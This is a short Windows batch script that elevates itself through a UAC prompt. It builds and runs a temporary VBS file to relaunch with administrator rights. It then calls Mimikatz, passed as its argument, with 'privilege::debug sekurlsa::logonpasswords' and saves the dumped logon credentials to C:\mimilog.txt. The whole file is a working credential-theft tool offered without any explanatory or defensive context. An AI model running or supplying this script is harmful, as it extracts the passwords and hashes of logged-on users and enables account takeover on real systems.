  @echo off

     call :isAdmin

     if %errorlevel% == 0 (
        goto :run
     ) else (
        echo Requesting administrative privileges...
        goto :UACPrompt
     )

     exit /b

     :isAdmin
        fsutil dirty query %systemdrive% >nul
     exit /b

     :run
      %1 privilege::debug sekurlsa::logonpasswords exit>C:\mimilog.txt
     exit /b

     :UACPrompt
       echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
       echo UAC.ShellExecute "cmd.exe", "/c %~s0 %~1", "", "runas", 1 >> "%temp%\getadmin.vbs"

       "%temp%\getadmin.vbs"
       del "%temp%\getadmin.vbs"
      exit /B`